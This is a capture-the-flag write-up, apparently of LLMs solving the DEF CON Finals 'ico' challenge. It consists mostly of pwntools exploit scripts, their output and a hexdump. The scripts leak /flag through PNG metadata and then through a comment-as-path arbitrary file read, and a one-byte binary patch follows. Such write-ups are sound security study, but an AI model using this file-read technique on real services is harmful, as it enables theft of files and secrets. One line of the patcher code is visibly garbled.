# All You Need Is MCP – LLMs Solving a DEF CON CTF Finals Challenge

> 原文: https://www.ctfiot.com/257948.html
> ID: 257948


```
[*] '/home/clasm/ctfs/dc-finals-25/ico/ico'
 Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: No canary found
 NX: NX enabled
 PIE: No PIE (0x400000)
from pwn import remote # type: ignore
import os, sys, time

host = os.environ.get("HOST", "127.0.0.1")
port = int(os.environ.get("PORT", "4265"))

io = remote(host, port)

# handshake
io.send(b"\x10") # enable
time.sleep(0.05)

# create default entry that copies /flag into "Author"
io.send(b"\x22")
time.sleep(0.05)

# request metadata bundle: Author (flag), Software, (Comment if set)
io.send(b"\x32" + b"\x01") # 0x01 arbitrary small param

data = io.recv(timeout=2) or b""
print(f"len={len(data)} hex={data.hex()}")

# Heuristic extract: look for ASCII 'Author' then next string-ish bytes
idx = data.find(b"Author")
if idx != -1:
 # naive slice forward; adjust if you want a proper parser
 print("Found 'Author' near:", idx)
 print(data[idx:
idx+256])

# clean close (optional)
io.send(b"\x11")
io.close()
[x] Opening connection to 127.0.0.1 on port 4265
[x] Opening connection to 127.0.0.1 on port 4265: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 4265: Done
len=2 hex=0001
[*] Closed connection to 127.0.0.1 port 4265
On each connection, before handling commands, it loads the contents of /flag into a global string buffer off_51C2E0:
 idk_what_this_is_man → sets path to "/flag", reads it, stores pointer into off_51C2E0.

0x32: returns a packaged metadata block containing:
- "Author" → directly the string at +40 (which is the flag)
- "Comment" (only if previously set via 0x31)
- "Software" → the string at +72
- It requires one extra byte after 0x32 (any small value; used as a dimension).
from __future__ import annotations

from pwn import remote # type: ignore
import os
import re
from typing import Dict, Tuple, Optional, List

# Protocol helpers -----------------------------------------------------------

def send_cmd(io, data: bytes) -> None:
 io.send(data)

def read_exact(io, n: int, timeout: float = 2.0) -> bytes:
 data = b""
 while len(data) < n:
 chunk = io.recv(n - len(data), timeout=timeout)
 if not chunk:
 break
 data += chunk
 return data

def read_chunk(io, timeout: float = 2.0) -> Optional[Tuple[int, bytes]]:
 """Read one server chunk: 1-byte tag + 2-byte little-endian length + payload."""
 hdr = read_exact(io, 3, timeout=timeout)
 if len(hdr) < 3:
 return None
 tag = hdr[0]
 length = hdr[1] | (hdr[2] << 8)
 payload = read_exact(io, length, timeout=timeout)
 if len(payload) < length:
 return None
 return tag, payload

# Response parsing -----------------------------------------------------------

PRINTABLE_RE = re.compile(rb"[ -~]{1,256}")

def tokenize_printables(data: bytes) -> List[bytes]:
 return [m.group(0) for m in PRINTABLE_RE.finditer(data)]

def parse_kv_payload(payload: bytes) -> Dict[str, str]:
 """Best-effort parse of a key/value bundle produced by opcode 0x32.

 The server serializes a small structure with fields like "Author", "Comment",
 and "Software" using an internal container format. We conservatively scan the
 payload for printable tokens and map well-known keys to the token that follows.
 """
 tokens = tokenize_printables(payload)
 keys = {b"Author", b"Comment", b"Software"}
 out: Dict[str, str] = {}
 for i, tok in enumerate(tokens):
 if tok in keys and i + 1 < len(tokens):
 # Prefer the very next printable token as the value
 key = tok.decode("ascii", errors="ignore")
 val = tokens[i + 1].decode("utf-8", errors="ignore")
 # Guard against obviously invalid huge values
 if len(val) > 0:
 out[key] = val
 return out

# Exploit flow ---------------------------------------------------------------

def exploit_fetch_metadata(io) -> Tuple[Optional[Dict[str, str]], bytes]:
 # 0x10: enable session; 0x22: build default entry with flag in Author; 0x32 x01: request bundle
 send_cmd(io, b"\x10")
 io.recv(timeout=0.1) # ignore 1-byte ack if present
 send_cmd(io, b"\x22")
 io.recv(timeout=0.1)
 send_cmd(io, b"\x32\x01")

 chunk = read_chunk(io, timeout=2.0)
 if not chunk:
 return None, b""
 tag, payload = chunk
 parsed = parse_kv_payload(payload)
 return parsed, payload

def main():
 host = os.environ.get("HOST", "127.0.0.1")
 port = int(os.environ.get("PORT", "4265"))
 io = remote(host, port)
 try:
 kv, raw = exploit_fetch_metadata(io)
 if kv:
 print("Parsed fields:")
 for k in ("Author", "Comment", "Software"):
 if k in kv:
 print(f"- {k}: {kv[k]}")
 if "Author" in kv:
 print(f"\nAuthor (likely flag): {kv['Author']}")
 else:
 print(f"No parsable KV bundle. Raw chunk ({len(raw)} bytes): {raw.hex()}")
 finally:
 try:
 send_cmd(io, b"\x11") # close session politely
 
except Exception:
 pass
 io.close()

if __name__ == "__main__":
 main()
[x] Opening connection to 127.0.0.1 on port 4265
[x] Opening connection to 127.0.0.1 on port 4265: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 4265: Done
No parsable KV bundle. Raw chunk (153 bytes): 89504e470d0a1a0a0000000d494844520000000200000002080600000072b60d240000001049444154789c63606060f80fc51002001cf502fe6a1cd9170000002774455874417574686f72004433454236413636393436383137434438423834463533304333303833414539388d42bd0000001174455874536f6674776172650069636f2076302e3155c7b0f20000000049454e44ae426082
[*] Closed connection to 127.0.0.1 port 4265
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452 .PNG........IHDR
00000010: 0000 0002 0000 0002 0806 0000 0072 b60d .............r..
00000020: 2400 0000 1049 4441 5478 9c63 6060 60f8 $....IDATx.c```.
00000030: 0fc5 1002 001c f502 fe6a 1cd9 1700 0000 .........j......
00000040: 2774 4558 7441 7574 686f 7200 3142 3542 'tEXtAuthor.1B5B
00000050: 3535 4534 3234 3233 3742 3046 4637 3044 55E424237B0FF70D
00000060: 3244 4145 3644 3739 4632 3236 92fa 8501 2DAE6D79F226....
00000070: 0000 0011 7445 5874 536f 6674 7761 7265 ....tEXtSoftware
00000080: 0069 636f 2076 302e 3155 c7b0 f200 0000 .ico v0.1U......
00000090: 0049 454e 44ae 4260 82 .IEND.B`.
Applied thorough IDA updates:
- Renamed key routines: server_main, accept_fork_loop, handle_connection, dispatch_loop, drop_privileges_to_user, set_alarm_seconds, recv_checked, send_checked, send_ack, send_nack, send_tagged_blob, read_u16_le, recv_allocated_blob, command handlers cmd_*, init_flag_from_file, init_default_metadata_with_flag, metadata getters get_author/get_software/get_comment_value, and parse_ncif_container.
- Renamed global off_51C2E0 to g_FlagString.
- Added comments summarizing protocol and exfil path on dispatch_loop, cmd_send_metadata_bundle, init_flag_from_file, init_default_metadata_with_flag, server_main, and helpers.

Impact:
The decompilation now clearly reflects the protocol, the /flag loading, and the metadata flow used for exfil.
Full exploit chain (concise)
Server boot

server_main:
sets PORT (default 4265), creates listening socket.

accept_fork_loop:
accept(), fork().

In child:
drop_privileges_to_user, set_alarm_seconds(16), close listen fd, then handle_connection.

Per-connection setup
handle_connection first calls init_flag_from_file:
Opens “/flag”, reads it, and stores the string globally in g_FlagString.

Enters dispatch_loop (byte-oriented protocol).

Handshake requirement
Until session is “enabled”, the loop only reacts to:

0x10 → send_byte_0: sets a flag to enable the session and replies with 1-byte ack.

0x11 → end session.

After 0x10, the full switch is active.
Data model (entries)
The server maintains a list; field_10 is “current index”.

init_default_metadata_with_flag creates a new entry with:
Author = g_FlagString (the contents of “/flag”),
Software = “ico v0.1”,
optional Comment (set via another command).

Minimal exfil path
0x10: enable session.
0x22: cmd_create_default_entry → creates/selects entry with Author = g_FlagString.
0x32 <1 byte param>: cmd_send_metadata_bundle → sends a bundle that includes:
“Author” = g_FlagString,
“Comment” if previously set,
“Software”.

The bundle is sent via send_tagged_blob: 1-byte tag, 2-byte little-endian length, then payload bytes.

Why it works
init_flag_from_file loads “/flag” for every connection and saves it in g_FlagString.
cmd_create_default_entry copies that global pointer into the new entry’s Author field.
cmd_send_metadata_bundle serializes the entry and returns the Author field verbatim.

Bytes to send (in order)
b"\x10"
b"\x22"
b"\x32\x01"
Optionally b"\x11" to close.

Response parsing
Read one chunk: tag (1), length (2 LE), payload.

Payload is a small container; scanning printables, the token “Author” is followed by the flag string.
The included poc_ncif.py does this sequence and extracts “Author”.
from __future__ import annotations

from pwn import remote # type: ignore
import os
import re
from typing import Dict, Tuple, Optional, List

# Protocol helpers -----------------------------------------------------------

def send_cmd(io, data: bytes) -> None:
 io.send(data)

def read_exact(io, n: int, timeout: float = 2.0) -> bytes:
 data = b""
 while len(data) < n:
 chunk = io.recv(n - len(data), timeout=timeout)
 if not chunk:
 break
 data += chunk
 return data

def read_chunk(io, timeout: float = 2.0) -> Optional[Tuple[int, bytes]]:
 """Read one server chunk: 1-byte tag + 2-byte little-endian length + payload."""
 hdr = read_exact(io, 3, timeout=timeout)
 if len(hdr) < 3:
 return None
 tag = hdr[0]
 length = hdr[1] | (hdr[2] << 8)
 payload = read_exact(io, length, timeout=timeout)
 if len(payload) < length:
 return None
 return tag, payload

# Response parsing -----------------------------------------------------------

PRINTABLE_RE = re.compile(rb"[ -~]{1,256}")

def tokenize_printables(data: bytes) -> List[bytes]:
 return [m.group(0) for m in PRINTABLE_RE.finditer(data)]

def parse_png_text_chunks(payload: bytes) -> Dict[str, str]:
 """Parse PNG tEXt chunks into a dict of key->value.

 PNG layout: 8-byte signature, then repeated [length(4 BE), type(4), data, crc(4)].
 For type 'tEXt', data is keyword(ASCII) + 0x00 + text(ISO-8859-1/ASCII).
 """
 out: Dict[str, str] = {}
 # PNG signature
 if not (len(payload) >= 8 and payload[:8] == b"\x89PNG\r\n\x1a\n"):
 return out
 off = 8
 while off + 12 <= len(payload):
 length = int.from_bytes(payload[off : off + 4], "big")
 ctype = payload[off + 4 : off + 8]
 off += 8
 if off + length + 4 > len(payload):
 break
 data = payload[off : off + length]
 off += length
 crc = payload[off : off + 4]
 off += 4
 if ctype == b"tEXt":
 try:
 if b"\x00" in data:
 key, value = data.split(b"\x00", 1)
 k = key.decode("latin-1", errors="ignore")
 v = value.decode("latin-1", errors="ignore")
 if k:
 out[k] = v
 
except Exception:
 pass
 if ctype == b"IEND":
 break
 return out

def parse_kv_payload(payload: bytes) -> Dict[str, str]:
 """Best-effort parse of a key/value bundle produced by opcode 0x32.

 The server serializes a small structure with fields like "Author", "Comment",
 and "Software" using an internal container format. We conservatively scan the
 payload for printable tokens and map well-known keys to the token that follows.
 """
 # First, handle PNG tEXt-encoded bundles, which the server commonly emits
 # (Author/Software are stored as PNG text chunks).
 png = parse_png_text_chunks(payload)
 if png:
 return png

 tokens = tokenize_printables(payload)
 keys = {b"Author", b"Comment", b"Software"}
 out: Dict[str, str] = {}
 for i, tok in enumerate(tokens):
 # Allow cases like 'tEXtAuthor' by checking substring containment
 matched_key: Optional[bytes] = None
 for k in keys:
 if tok == k or (k in tok):
 matched_key = k
 break
 if matched_key and i + 1 < len(tokens):
 # Prefer the very next printable token as the value
 key = matched_key.decode("ascii", errors="ignore")
 val = tokens[i + 1].decode("utf-8", errors="ignore")
 # Guard against obviously invalid huge values
 if len(val) > 0:
 out[key] = val
 return out

# Exploit flow ---------------------------------------------------------------

def exploit_fetch_metadata(io) -> Tuple[Optional[Dict[str, str]], bytes]:
 # 0x10: enable session; 0x22: build default entry with flag in Author; 0x32 x01: request bundle
 send_cmd(io, b"\x10")
 io.recv(timeout=1.1) # ignore 1-byte ack if present
 send_cmd(io, b"\x22")
 io.recv(timeout=1.1)
 send_cmd(io, b"\x32\x01")

 chunk = read_chunk(io, timeout=2.0)
 if not chunk:
 return None, b""
 tag, payload = chunk
 parsed = parse_kv_payload(payload)
 return parsed, payload

def main():
 host = os.environ.get("HOST", "127.0.0.1")
 port = int(os.environ.get("PORT", "4265"))
 io = remote(host, port)
 try:
 kv, raw = exploit_fetch_metadata(io)
 if kv:
 print("Parsed fields:")
 for k in ("Author", "Comment", "Software"):
 if k in kv:
 print(f"- {k}: {kv[k]}")
 if "Author" in kv:
 print(f"\nAuthor (likely flag): {kv['Author']}")
 else:
 print(f"No parsable KV bundle. Raw chunk ({len(raw)} bytes): {raw.hex()}")
 finally:
 try:
 send_cmd(io, b"\x11") # close session politely
 
except Exception:
 pass
 io.close()

if __name__ == "__main__":
 main()
[x] Opening connection to 127.0.0.1 on port 4265
[x] Opening connection to 127.0.0.1 on port 4265: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 4265: Done
Parsed fields:
- Author: 1B5B55E424237B0FF70D2DAE6D79F226
- Software: ico v0.1

Author (likely flag): 1B5B55E424237B0FF70D2DAE6D79F226
[*] Closed connection to 127.0.0.1 port 4265
Evidence:
Your extract: Author = 1B5B55E424237B0FF70D2DAE6D79F226

MD5(flag{WINNER_WINNER_CHICKEN_DINNER}) = 1B5B55E424237B0FF70D2DAE6D79F226 (matches)
echo -en 'flag{WINNER_WINNER_CHICKEN_DINNER}' | md5sum
1b5b55e424237b0ff70d2dae6d79f226 -
from __future__ import annotations

from pwn import remote # type: ignore
from pwn import p16 # type: ignore
import os
import re
from typing import Dict, Tuple, Optional, List

# Protocol helpers -----------------------------------------------------------

def send_cmd(io, data: bytes) -> None:
 io.send(data)

def read_exact(io, n: int, timeout: float = 2.0) -> bytes:
 data = b""
 while len(data) < n:
 chunk = io.recv(n - len(data), timeout=timeout)
 if not chunk:
 break
 data += chunk
 return data

def read_chunk(io, timeout: float = 2.0) -> Optional[Tuple[int, bytes]]:
 """Read one server chunk: 1-byte tag + 2-byte little-endian length + payload."""
 hdr = read_exact(io, 3, timeout=timeout)
 if len(hdr) < 3:
 return None
 tag = hdr[0]
 length = hdr[1] | (hdr[2] << 8)
 payload = read_exact(io, length, timeout=timeout)
 if len(payload) < length:
 return None
 return tag, payload

def send_length_prefixed_blob(io, data: bytes) -> None:
 io.send(p16(len(data), endian="little") + data)

# Response parsing -----------------------------------------------------------

PRINTABLE_RE = re.compile(rb"[ -~]{1,256}")

def tokenize_printables(data: bytes) -> List[bytes]:
 return [m.group(0) for m in PRINTABLE_RE.finditer(data)]

def parse_png_text_chunks(payload: bytes) -> Dict[str, str]:
 """Parse PNG tEXt chunks into a dict of key->value.

 PNG layout: 8-byte signature, then repeated [length(4 BE), type(4), data, crc(4)].
 For type 'tEXt', data is keyword(ASCII) + 0x00 + text(ISO-8859-1/ASCII).
 """
 out: Dict[str, str] = {}
 # PNG signature
 if not (len(payload) >= 8 and payload[:8] == b"\x89PNG\r\n\x1a\n"):
 return out
 off = 8
 while off + 12 <= len(payload):
 length = int.from_bytes(payload[off : off + 4], "big")
 ctype = payload[off + 4 : off + 8]
 off += 8
 if off + length + 4 > len(payload):
 break
 data = payload[off : off + length]
 off += length
 crc = payload[off : off + 4]
 off += 4
 if ctype == b"tEXt":
 try:
 if b"\x00" in data:
 key, value = data.split(b"\x00", 1)
 k = key.decode("latin-1", errors="ignore")
 v = value.decode("latin-1", errors="ignore")
 if k:
 out[k] = v
 
except Exception:
 pass
 if ctype == b"IEND":
 break
 return out

def parse_kv_payload(payload: bytes) -> Dict[str, str]:
 """Best-effort parse of a key/value bundle produced by opcode 0x32.

 The server serializes a small structure with fields like "Author", "Comment",
 and "Software" using an internal container format. We conservatively scan the
 payload for printable tokens and map well-known keys to the token that follows.
 """
 # First, handle PNG tEXt-encoded bundles, which the server commonly emits
 # (Author/Software are stored as PNG text chunks).
 png = parse_png_text_chunks(payload)
 if png:
 return png

 tokens = tokenize_printables(payload)
 keys = {b"Author", b"Comment", b"Software"}
 out: Dict[str, str] = {}
 for i, tok in enumerate(tokens):
 # Allow cases like 'tEXtAuthor' by checking substring containment
 matched_key: Optional[bytes] = None
 for k in keys:
 if tok == k or (k in tok):
 matched_key = k
 break
 if matched_key and i + 1 < len(tokens):
 # Prefer the very next printable token as the value
 key = matched_key.decode("ascii", errors="ignore")
 val = tokens[i + 1].decode("utf-8", errors="ignore")
 # Guard against obviously invalid huge values
 if len(val) > 0:
 out[key] = val
 return out

# Exploit flow ---------------------------------------------------------------

def exploit_fetch_metadata(io) -> Tuple[Optional[Dict[str, str]], bytes]:
 # 0x10: enable session; 0x22: build default entry with flag in Author; 0x32 x01: request bundle
 send_cmd(io, b"\x10")
 io.recv(timeout=1.1) # ignore 1-byte ack if present
 send_cmd(io, b"\x22")
 io.recv(timeout=1.1)
 send_cmd(io, b"\x32\x01")

 chunk = read_chunk(io, timeout=2.0)
 if not chunk:
 return None, b""
 tag, payload = chunk
 parsed = parse_kv_payload(payload)
 return parsed, payload

def exploit_fetch_flag_via_comment(io) -> bytes:
 """Abuse comment type=2 (path) to read /flag plaintext and return it."""
 # 0x10: enable
 send_cmd(io, b"\x10")
 io.recv(timeout=0.5)
 # 0x22: create default entry (comment type preset to 2)
 send_cmd(io, b"\x22")
 io.recv(timeout=0.5)
 # 0x31: set comment to path "/flag" (length-prefixed blob)
 send_cmd(io, b"\x31")
 send_length_prefixed_blob(io, b"/flag")
 io.recv(timeout=0.5)
 # 0x30: get comment value; server returns a tagged blob containing file contents
 send_cmd(io, b"\x30")
 chunk = read_chunk(io, timeout=2.0)
 if not chunk:
 return b""
 _tag, payload = chunk
 return payload

def main():
 host = os.environ.get("HOST", "127.0.0.1")
 port = int(os.environ.get("PORT", "4265"))
 io = remote(host, port)
 try:
 # First path: MD5-hex via PNG metadata bundle
 kv, raw = exploit_fetch_metadata(io)
 if kv:
 print("Parsed fields:")
 for k in ("Author", "Comment", "Software"):
 if k in kv:
 print(f"- {k}: {kv[k]}")
 if "Author" in kv:
 print(f"\nAuthor (MD5 of flag): {kv['Author']}")
 else:
 print(f"No parsable KV bundle. Raw chunk ({len(raw)} bytes)")

 # Second path: plaintext flag via comment-as-path trick
 try:
 plain = exploit_fetch_flag_via_comment(io)
 if plain:
 print(f"\nPlaintext flag via comment: {plain.decode('utf-8', errors='ignore')}")
 else:
 print("\nFailed to fetch plaintext flag via comment.")
 
except Exception as e:
 print(f"\nError fetching plaintext flag via comment: {e}")
 finally:
 try:
 send_cmd(io, b"\x11") # close session politely
 
except Exception:
 pass
 io.close()

if __name__ == "__main__":
 main()
[x] Opening connection to 127.0.0.1 on port 4265
[x] Opening connection to 127.0.0.1 on port 4265: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 4265: Done
Parsed fields:
- Author: 1B5B55E424237B0FF70D2DAE6D79F226
- Software: ico v0.1

Author (MD5 of flag): 1B5B55E424237B0FF70D2DAE6D79F226

Plaintext flag via comment: flag{WINNER_WINNER_CHICKEN_DINNER}

[*] Closed connection to 127.0.0.1 port 4265
0x10 enables the session (ACK).
0x22 creates a default en
try: it sets type at offset +48 to 2 (path mode), Author to g_FlagString (MD5-hex of /flag), Software to "ico v0.1".
0x31 length-prefixed blob sets the Comment value at offset +56 (we send "/flag").
0x30 returns the Comment. Because type==2, the server treats Comment as a path and returns file contents → plaintext flag.
#!/usr/bin/env python3
"""
Minimal, pure-Python patcher for 'ico' to disable comment-as-path default.

It flips the immediate '2' -> '1' in the instruction at VA 0x45F24D:
 mov byte [<obj>+0x30], 0x2 ; sets comment type to PATH (2)
We change the imm8 to 0x1 so comment type defaults to LITERAL (1).

Implementation details:
- Computes file offset of the VA via ELF program headers (PT_LOAD mapping)
- Writes one byte at (file_off + 3), since the encoding is: C6 .. .. 

Usage:
 python3 patch_simple.py /path/to/ico
Creates /path/to/ico.bak backup.
"""

import os
import shutil
import struct
import sys
from typing import Tuple

TARGET_VA = 0x45F24D # start of 'mov byte [*+0x30], 0x2'
IMM_DELTA = 3 # imm8 is the 4th byte in typical encoding C6 ?? disp8 imm8

def elf64_read_phdr_mapping(f) -> Tuple[int, int, int]:
 f.seek(0)
 ehdr = f.read(0x40)
 if len(ehdr) < 0x40 or ehdr[:4] != b"\x7fELF":
 raise RuntimeError("not an ELF file")
 ei_class = ehdr[4]
 ei_data = ehdr[5]
 if ei_class != 2 or ei_data != 1:
 raise RuntimeError("expected ELF64 little-endian")
 e_phoff = struct.unpack_from("<Q", ehdr, 0x20)[0]
 e_phentsize = struct.unpack_from("<H", ehdr, 0x36)[0]
 e_phnum = struct.unpack_from("<H", ehdr, 0x38)[0]

 for i in range(e_phnum):
 f.seek(e_phoff + i * e_phentsize)
 ph = f.read(e_phentsize)
 if len(ph) < e_phentsize:
 break
 p_type = struct.unpack_from(" None:
 path = sys.argv[1] if len(sys.argv) > 1 else "ico"
 if not os.path.isfile(path):
 print(f"error: binary not found: {path}")
 sys.exit(1)

 backup = path + ".bak"
 if not os.path.exists(backup):
 shutil.copy2(path, backup)
 print(f"backup created: {backup}")

 with open(path, "r+b") as f:
 p_offset, p_vaddr, _ = elf64_read_phdr_mapping(f)
 file_off = p_offset + (TARGET_VA - p_vaddr)
 imm_off = file_off + IMM_DELTA

 f.seek(file_off)
 insn = f.read(8)
 if len(insn) < 4:
 raise RuntimeError("failed to read instruction bytes")

 # Sanity: first byte should be 0xC6 (mov r/m8, imm8) in typical codegen
 # and the current imm8 should be 0x02.
 ok = True
 if insn[0] != 0xC6:
 print("warning: opcode 0xC6 not found at target; proceeding anyway")
 ok = False
 if insn[3] != 0x02:
 print(f"warning: unexpected imm8 {insn[3]:#x} at target; proceeding anyway")
 ok = False
 print(f"before bytes: {insn[:4].hex()}")

 # Write imm8 = 0x01
 f.seek(imm_off)
 f.write(b"\x01")

 f.seek(file_off)
 after = f.read(4)
 print(f"after bytes: {after.hex()}")
 if ok and after[0] == 0xC6 and after[3] == 0x01:
 print("patch applied: default comment type now 1 (literal)")
 else:
 print("patch written; verify in a disassembler")

if __name__ == "__main__":
 main()
```
